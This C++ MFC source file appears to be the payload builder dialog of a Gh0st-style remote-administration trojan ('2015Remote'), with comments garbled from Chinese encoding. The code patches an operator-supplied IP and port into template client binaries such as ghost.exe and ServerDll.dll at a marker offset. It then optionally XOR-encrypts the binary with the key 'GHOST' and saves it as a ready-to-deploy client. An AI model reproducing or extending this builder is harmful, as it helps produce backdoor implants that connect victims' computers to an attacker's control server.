// BuildDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "2015Remote.h"
#include "BuildDlg.h"
#include "afxdialogex.h"
#include <io.h>

// CBuildDlg �Ի���

IMPLEMENT_DYNAMIC(CBuildDlg, CDialog)

int MemoryFind(const char *szBuffer, const char *Key, int iBufferSize, int iKeySize);

CBuildDlg::CBuildDlg(CWnd* pParent)
	: CDialog(CBuildDlg::IDD, pParent)
	, m_strIP(_T(""))
	, m_strPort(_T(""))
{

}

CBuildDlg::~CBuildDlg()
{
}

void CBuildDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT_IP, m_strIP);
	DDX_Text(pDX, IDC_EDIT_PORT, m_strPort);
	DDX_Control(pDX, IDC_COMBO_EXE, m_ComboExe);
	DDX_Control(pDX, IDC_COMBO_ENCRYPT, m_ComboEncrypt);
}


BEGIN_MESSAGE_MAP(CBuildDlg, CDialog)
	ON_BN_CLICKED(IDOK, &CBuildDlg::OnBnClickedOk)
END_MESSAGE_MAP()


// CBuildDlg ��Ϣ�������


void CBuildDlg::OnBnClickedOk()
{
	CFile File;
	char szTemp[MAX_PATH];
	ZeroMemory(szTemp,MAX_PATH);
	CString strCurrentPath;
	CString strFile;
	CString strSeverFile;
	BYTE *  szBuffer=NULL;
	DWORD dwFileSize;
	UpdateData(TRUE);
	int index = m_ComboExe.GetCurSel();
	CString file;
	switch (index)
	{
	case CLIENT_TYPE_DLL:
		file = "TestRun.exe";
		break;
	case CLIENT_TYPE_ONE:
		file = "ghost.exe";
		break;
	case CLIENT_TYPE_MODULE:
		file = "ServerDll.dll";
		break;
	default:
		break;
	}
	if (file.IsEmpty())
	{
		MessageBox("��Ч�������, ���������ɷ���!");
		return CDialog::OnOK();
	}
	unsigned long flag = index == 0 ? FLAG_FINDEN : FLAG_GHOST;
	//////////������Ϣ//////////////////////
	CONNECT_ADDRESS g_ConnectAddress = { flag, "", 0, index };
	g_ConnectAddress.SetServer(m_strIP, atoi(m_strPort));

	if (!g_ConnectAddress.IsValid())
		return;
	try
	{
		//�˴��õ�δ����ǰ���ļ���
		char path[_MAX_PATH], *p = path;
		GetModuleFileNameA(NULL, path, sizeof(path));
		while (*p) ++p;
		while ('\\' != *p) --p;
		strcpy(p+1, file.GetString());

		strFile = path; //�õ���ǰδ�����ļ���
		if (_access(path, 0) == -1)
		{
			MessageBox(CString(path) + "\r\n����ģ��\"" + file + "\"������!");
			return CDialog::OnOK();
		}
		
		//���ļ�
		File.Open(strFile,CFile::modeRead|CFile::typeBinary);
		
		dwFileSize=File.GetLength();
		szBuffer=new BYTE[dwFileSize];
		ZeroMemory(szBuffer,dwFileSize);
		//��ȡ�ļ�����
		
		File.Read(szBuffer,dwFileSize);
		File.Close();
		//д������IP�Ͷ˿� ��Ҫ��Ѱ��0x1234567�����ʶȻ��д�����λ��
		int iOffset = MemoryFind((char*)szBuffer,(char*)&g_ConnectAddress.Flag(),dwFileSize,sizeof(DWORD));
		if (iOffset==-1)
		{
			MessageBox(CString(path) + "\r\n����ģ��\"" + file + "\"��֧��!");
			return;
		}
		if (MemoryFind((char*)szBuffer + iOffset + sizeof(sizeof(g_ConnectAddress)), (char*)&g_ConnectAddress.Flag(),
			dwFileSize - iOffset - sizeof(sizeof(g_ConnectAddress)), sizeof(DWORD)) != -1) {
			MessageBox(CString(path) + "\r\n����ģ��\"" + file + "\"������!");
			return;
		}
		memcpy(szBuffer+iOffset,&g_ConnectAddress,sizeof(g_ConnectAddress));
		//���浽�ļ�
		if (index == CLIENT_TYPE_MODULE)
		{
			strcpy(p + 1, "ClientDemo.dll");
		}
		else {
			strcpy(p + 1, "ClientDemo.exe");
		}
		strSeverFile = path;
		DeleteFileA(path);
		BOOL r=File.Open(strSeverFile,CFile::typeBinary|CFile::modeCreate|CFile::modeWrite);
		if (!r) {
			MessageBox(strSeverFile + "\r\n�������\"" + strSeverFile + "\"����ʧ��!");
			return CDialog::OnOK();
		}
		Encrypt(szBuffer, dwFileSize, m_ComboEncrypt.GetCurSel());
		File.Write(szBuffer, dwFileSize);
		File.Close();
		delete[] szBuffer;
		MessageBox("���ɳɹ�!�ļ�λ��:\r\n"+ strSeverFile);
	}
	catch (CMemoryException* e)
	{
		MessageBox("�ڴ治��!");
	}
	catch (CFileException* e)
	{
		MessageBox("�ļ���������!");
	}
	catch (CException* e)
	{
		MessageBox("δ֪����!");
	}
	CDialog::OnOK();
}

int MemoryFind(const char *szBuffer, const char *Key, int iBufferSize, int iKeySize)   
{   
	int i,j;   
	if (iKeySize == 0||iBufferSize==0)
	{
		return -1;
	}
	for (i = 0; i < iBufferSize; ++i)   
	{   
		for (j = 0; j < iKeySize; j ++)   
			if (szBuffer[i+j] != Key[j])	break;
		if (j == iKeySize) return i;   
	}   
	return -1;   
}


BOOL CBuildDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  �ڴ���Ӷ���ĳ�ʼ��
	m_ComboExe.InsertString(CLIENT_TYPE_DLL, "TestRun.exe");
	m_ComboExe.InsertString(CLIENT_TYPE_ONE, "ghost.exe");
	m_ComboExe.InsertString(CLIENT_TYPE_MODULE, "ServerDll.dll");
	m_ComboExe.SetCurSel(0);

	m_ComboEncrypt.InsertString(0, "��");
	m_ComboEncrypt.InsertString(1, "XOR");
	m_ComboEncrypt.SetCurSel(0);

	return TRUE;  // return TRUE unless you set the focus to a control
				  // �쳣: OCX ����ҳӦ���� FALSE
}

Buffer CBuildDlg::Encrypt(BYTE* buffer, int len, int method) {
	switch (method)
	{
	case 0:// ������
		break;
	case 1: // XOR
		xor_encrypt_decrypt(buffer, len, { 'G', 'H', 'O', 'S', 'T' });
		break;
	default:
		break;
	}
	return Buffer();
}
